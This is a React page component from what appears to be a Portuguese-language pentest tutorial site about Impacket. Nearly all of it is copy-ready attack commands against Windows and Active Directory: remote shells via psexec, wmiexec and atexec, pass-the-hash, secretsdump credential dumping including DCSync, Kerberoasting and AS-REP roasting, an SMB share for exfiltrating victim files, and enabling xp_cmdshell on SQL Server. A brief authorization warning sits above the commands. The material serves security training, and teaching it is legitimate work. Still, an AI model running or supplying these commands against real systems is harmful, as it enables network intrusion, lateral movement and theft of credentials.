import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function Impacket() {
    return (
      <PageContainer
        title="Impacket — Arsenal para Windows e AD"
        subtitle="Coleção de ferramentas Python para interagir com protocolos Windows: SMB, RPC, Kerberos, DCOM e mais."
        difficulty="avancado"
        timeToRead="14 min"
      >
        <AlertBox type="danger" title="Ferramentas de exploração — use com autorização">
          Impacket é usado profissionalmente em pentests e red teams. Nunca use contra sistemas sem autorização.
        </AlertBox>

        <h2>Instalação</h2>
        <CodeBlock language="bash" code={'# No Kali, muitas ferramentas do Impacket já estão disponíveis\nimpacket-psexec --help\n\n# Instalar/atualizar via pip\npip3 install impacket\n\n# Clonar repositório (mais atual)\ngit clone https://github.com/fortra/impacket.git\ncd impacket && pip3 install .'} />

        <h2>psexec — Shell Remoto</h2>
        <CodeBlock language="bash" code={'# Shell com credenciais\nimpacket-psexec DOMINIO/usuario:senha@192.168.1.10\nimpacket-psexec Admin:P@ssw0rd@192.168.1.10\n\n# Pass-the-Hash\nimpacket-psexec -hashes LM:NT DOMINIO/Admin@192.168.1.10\nimpacket-psexec -hashes :NT_ONLY DOMINIO/Admin@192.168.1.10\n\n# Executar comando específico\nimpacket-psexec Admin:senha@192.168.1.10 whoami'} />

        <h2>smbclient / smbserver</h2>
        <CodeBlock language="bash" code={'# Listar compartilhamentos\nimpacket-smbclient DOMINIO/usuario:senha@192.168.1.10\n\n# Dentro do smbclient:\n# shares    — listar compartilhamentos\n# use C$    — acessar compartilhamento C$\n# ls        — listar arquivos\n# get arquivo.txt\n\n# Criar servidor SMB para exfiltrar/transferir dados\nimpacket-smbserver share /tmp/compartilhado -smb2support\n# Na vítima (Windows):\n# copy C:\\arquivo.txt \\\\IP_KALI\\share\\'} />

        <h2>secretsdump — Extração de Credenciais</h2>
        <CodeBlock language="bash" code={'# Extrair hashes SAM remotamente\nimpacket-secretsdump DOMINIO/Admin:senha@192.168.1.10\n\n# Via Pass-the-Hash\nimpacket-secretsdump -hashes :HASH DOMINIO/Admin@192.168.1.10\n\n# DCSync (extrair todo o AD)\nimpacket-secretsdump DOMINIO/Admin:senha@IP_DC -just-dc\nimpacket-secretsdump DOMINIO/Admin:senha@IP_DC -just-dc-ntlm\n\n# Arquivos SAM/SYSTEM locais (offline)\nimpacket-secretsdump -sam sam.hive -system system.hive LOCAL'} />

        <h2>wmiexec e atexec</h2>
        <CodeBlock language="bash" code={'# wmiexec — shell via WMI (mais furtivo que psexec)\nimpacket-wmiexec DOMINIO/Admin:senha@192.168.1.10\nimpacket-wmiexec -hashes :HASH DOMINIO/Admin@192.168.1.10\n\n# Executar comando único\nimpacket-wmiexec Admin:senha@192.168.1.10 "ipconfig /all"\n\n# atexec — executar via Task Scheduler\nimpacket-atexec DOMINIO/Admin:senha@192.168.1.10 whoami'} />

        <h2>GetADUsers e GetUserSPNs</h2>
        <CodeBlock language="bash" code={'# Listar todos os usuários do AD\nimpacket-GetADUsers -all DOMINIO.local/usuario:senha -dc-ip IP_DC\n\n# Usuários com SPN (Kerberoastáveis)\nimpacket-GetUserSPNs DOMINIO.local/usuario:senha -dc-ip IP_DC -request\n\n# Usuários sem pre-autenticação Kerberos\nimpacket-GetNPUsers DOMINIO.local/ -usersfile users.txt -dc-ip IP_DC'} />

        <h2>mssqlclient — Acesso a SQL Server</h2>
        <CodeBlock language="bash" code={'# Conectar ao SQL Server\nimpacket-mssqlclient DOMINIO/sa:senha@192.168.1.10\nimpacket-mssqlclient -windows-auth DOMINIO/Admin:senha@192.168.1.10\n\n# Dentro do mssqlclient:\n# SQL> SELECT name FROM master..sysdatabases\n# SQL> EXEC xp_cmdshell \'whoami\'  (se habilitado)\n\n# Habilitar xp_cmdshell\n# SQL> EXEC sp_configure \'show advanced options\', 1\n# SQL> RECONFIGURE\n# SQL> EXEC sp_configure \'xp_cmdshell\', 1\n# SQL> RECONFIGURE'} />

        <AlertBox type="success" title="CrackMapExec — wrapper do Impacket">
          CrackMapExec (CME ou NetExec) é um wrapper que usa o Impacket para automatizar
          ataques contra muitos hosts de uma vez. Ideal para movimentação lateral em larga escala.
        </AlertBox>
      </PageContainer>
    );
  }
  